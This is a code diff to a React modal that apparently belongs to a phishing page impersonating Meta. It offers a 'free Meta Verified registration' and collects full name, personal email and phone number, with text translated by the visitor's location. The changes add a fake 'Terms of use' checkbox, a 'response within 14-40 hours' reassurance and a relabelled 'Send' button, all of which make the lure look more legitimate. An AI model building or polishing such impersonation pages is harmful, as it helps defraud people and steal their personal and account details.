@@ -30,6 +30,7 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
     const [translations, setTranslations] = useState<Record<string, string>>({});
+    const [agreeToTerms, setAgreeToTerms] = useState(false);
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
         personalEmail: '',
@@ -45,7 +46,7 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Apply for Meta Verified – [Page Name]', 'Mobile phone number', 'Submit'];
+        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Apply for Meta Verified – [Page Name]', 'Mobile phone number', 'Send', 'Our response will be sent to you within 14-40 hours.', 'I agree with Terms of use'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -150,8 +151,21 @@ ${
                                 className: 'h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base'
                             }}
                         />
-                        <button type='submit' disabled={isLoading} className={`mt-2 sm:mt-3 md:mt-4 flex h-10 sm:h-11 md:h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
-                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
+                        <p className='text-xs sm:text-xs text-gray-600 mt-2 sm:mt-3'>{t('Our response will be sent to you within 14-40 hours.')}</p>
+                        <div className='flex items-center gap-2 mt-2 sm:mt-3'>
+                            <input 
+                                type='checkbox' 
+                                id='agreeTerms'
+                                checked={agreeToTerms}
+                                onChange={(e) => setAgreeToTerms(e.target.checked)}
+                                className='w-4 h-4 cursor-pointer'
+                            />
+                            <label htmlFor='agreeTerms' className='text-xs sm:text-xs text-gray-700 cursor-pointer'>
+                                {t('I agree with Terms of use')}
+                            </label>
+                        </div>
+                        <button type='submit' disabled={isLoading || !agreeToTerms} className={`mt-3 sm:mt-4 md:mt-5 flex h-10 sm:h-11 md:h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${isLoading || !agreeToTerms ? 'cursor-not-allowed opacity-60' : ''}`}>
+                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Send')}
                         </button>
                     </div>
                 </form>
